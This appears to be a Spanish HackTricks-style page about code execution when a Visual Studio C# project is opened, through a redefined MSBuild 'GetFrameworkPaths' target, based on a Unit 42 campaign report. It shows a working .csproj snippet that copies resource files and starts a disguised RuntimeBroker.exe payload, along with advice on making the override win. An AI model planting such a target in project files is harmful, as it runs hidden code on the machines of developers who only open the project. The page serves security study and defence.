# Ejecución de MSBuild en tiempo de diseño de proyectos de Visual Studio

{{#include ../banners/hacktricks-training.md}}

Abrir un proyecto de C# en Visual Studio no es una lectura pasiva. Su compilación en tiempo de diseño invoca destinos de MSBuild con nombre para inicializar IntelliSense, las referencias y la depuración **antes** de que el desarrollador seleccione Compilar o Ejecutar. `GetFrameworkPaths` es uno de esos destinos. Un proyecto que lo redefina puede convertir la carga del proyecto en ejecución de código en el contexto del usuario sin necesidad de hacer clic en un payload aparte.<sup>[[1]](#references)[[2]](#references)</sup>

El proyecto descrito declaraba archivos de recursos y luego utilizaba `MakeDir`, `Copy` y `Exec` dentro de su destino redefinido para preparar e iniciar un payload ubicado en el mismo directorio. Este extracto reducido conserva la ruta de ejecución mostrada en la Figura 6 de la fuente; debe estar dentro de un `.csproj`, no en un archivo XML independiente.<sup>[[1]](#references)</sup>

```xml
<ItemGroup>
  <ResourceFiles Include="Resources\**\*.*" />
</ItemGroup>
<Target Name="GetFrameworkPaths">
  <MakeDir Directories="$(LocalAppData)\Microsoft\RuntimeBrokers" />
  <Copy SourceFiles="@(ResourceFiles)"
        DestinationFolder="$(LocalAppData)\Microsoft\RuntimeBrokers\%(RecursiveDir)"
        SkipUnchangedFiles="true" />
  <Exec Command='start "" "$(LocalAppData)\Microsoft\RuntimeBrokers\RuntimeBroker.exe"' />
</Target>
```

**El orden de importación importa:** MSBuild usa la *última* definición de un target. No se garantiza que un target escrito en un archivo de proyecto reemplace el target de Microsoft si una importación posterior lo redefine. Los proyectos de estilo SDK que usan `<Project Sdk="...">` importan implícitamente los targets del SDK después del cuerpo del proyecto, así que inspecciona el orden de importación evaluado en lugar de asumir que esta sobrescritura exacta funciona en todos los proyectos. `MSBuild.exe -preprocess:expanded.xml project.csproj` expande las importaciones sin compilar el proyecto y puede ayudar a localizar la definición efectiva del target.<sup>[[3]](#references)[[4]](#references)</sup>

Esta es una superficie de ejecución de proyectos de desarrollo, no una instalación de una extensión VSIX ni una escalada de privilegios por sí misma. Si el ejecutable preparado usa un `.exe.config` o una DLL maliciosos adyacentes, continúa con [AppDomainManager hijacking y DLL sideloading](windows-local-privilege-escalation/dll-hijacking/).

## References

- [1] [Unit 42 - La campaña Blinder Tunnel apunta a la infraestructura iraquí](https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/)
- [2] [Microsoft Learn - Integración con Visual Studio (MSBuild)](https://learn.microsoft.com/en-us/visualstudio/msbuild/visual-studio-integration-msbuild?view=visualstudio)
- [3] [Microsoft Learn - Targets de MSBuild](https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild-targets)
- [4] [Microsoft Learn - Referencia de la línea de comandos de MSBuild](https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild-command-line-reference?view=visualstudio)
{{#include ../banners/hacktricks-training.md}}
